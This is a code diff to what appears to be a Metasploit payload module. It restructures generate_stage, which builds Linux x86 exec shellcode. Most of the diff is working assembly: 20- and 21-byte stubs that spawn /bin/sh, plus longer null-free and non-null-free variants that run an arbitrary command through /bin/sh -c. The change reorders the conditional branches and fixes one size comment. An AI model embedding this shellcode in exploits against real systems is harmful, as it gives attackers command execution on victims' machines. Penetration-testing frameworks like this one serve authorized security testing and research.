@@ -45,34 +45,42 @@ module MetasploitModule
   def generate_stage(opts={})
     cmd             = datastore['CMD'] || ''
     nullfreeversion = datastore['NullFreeVersion']
-    if !cmd.empty?
+    if cmd.empty?
+      #
+      # Builds the exec payload which executes a /bin/sh shell.
+      # execve("/bin/sh", NULL, NULL)
+      #
+      if nullfreeversion
+        # 21 bytes (null-free)
+        payload = <<-EOS
+            xor ecx, ecx     ; ecx = NULL
+            mul ecx          ; eax and edx = NULL
+            mov al, 0xb      ; execve syscall
+            push ecx         ; string '\0'
+            push 0x68732f2f  ; "//sh"
+            push 0x6e69622f  ; "/bin"
+            mov ebx, esp     ; pointer to "/bin//sh\0" cmd
+            int 0x80         ; bingo
+        EOS
+      else
+        # 20 bytes (not null-free)
+        payload = <<-EOS
+            xor ecx, ecx     ; ecx = NULL
+            mul ecx          ; eax and edx = NULL
+            mov al, 0xb      ; execve syscall
+            push 0x0068732f  ; "/sh\0"
+            push 0x6e69622f  ; "/bin"
+            mov ebx, esp     ; pointer to "/bin/sh\0" cmd
+            int 0x80         ; bingo
+        EOS
+      end
+    else
       #
       # Dynamically builds the exec payload based on the user's options.
       # execve("/bin/sh", ["/bin/sh", "-c", "CMD"], NULL)
       #
       pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)
-      if !nullfreeversion
-        # 36 bytes without cmd (not null-free)
-        payload = <<-EOS
-            push 0xb
-            pop eax
-            cdq
-            push edx
-            #{pushw_c_opt}   ; "-c"
-            mov edi, esp
-            push 0x0068732f  ; "/sh\0"
-            push 0x6e69622f  ; "/bin"
-            mov ebx, esp
-            push edx
-            call continue
-            db "#{cmd}", 0x00
-          continue:
-            push edi
-            push ebx
-            mov ecx, esp
-            int 0x80
-        EOS
-      else
+      if nullfreeversion
         if cmd.length > 0xffff
           raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
         end
@@ -85,7 +93,7 @@ module MetasploitModule
           end
         end
         mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"
-        # 47/49 bytes without cmd (not null-free)
+        # 47/49 bytes without cmd (null-free)
         payload  = <<-EOS
             xor ebx, ebx
             mul ebx
@@ -112,34 +120,26 @@ module MetasploitModule
             call afterjmp          ; call/pop cmd address
             db "#{cmd}"
         EOS
-      end
-    else
-      #
-      # Builds the exec payload which executes a /bin/sh shell.
-      # execve("/bin/sh", NULL, NULL)
-      #
-      if !nullfreeversion
-        # 20 bytes (not null-free)
+      else
+        # 36 bytes without cmd (not null-free)
         payload = <<-EOS
-            xor ecx, ecx     ; ecx = NULL
-            mul ecx          ; eax and edx = NULL
-            mov al, 0xb      ; execve syscall
+            push 0xb
+            pop eax
+            cdq
+            push edx
+            #{pushw_c_opt}   ; "-c"
+            mov edi, esp
             push 0x0068732f  ; "/sh\0"
             push 0x6e69622f  ; "/bin"
-            mov ebx, esp     ; pointer to "/bin/sh\0" cmd
-            int 0x80         ; bingo
-        EOS
-      else
-        # 21 bytes (null-free)
-        payload = <<-EOS
-            xor ecx, ecx     ; ecx = NULL
-            mul ecx          ; eax and edx = NULL
-            mov al, 0xb      ; execve syscall
-            push ecx         ; string '\0'
-            push 0x68732f2f  ; "//sh"
-            push 0x6e69622f  ; "/bin"
-            mov ebx, esp     ; pointer to "/bin/sh\0" cmd
-            int 0x80         ; bingo
+            mov ebx, esp
+            push edx
+            call continue
+            db "#{cmd}", 0x00
+          continue:
+            push edi
+            push ebx
+            mov ecx, esp
+            int 0x80
         EOS
       end
     end
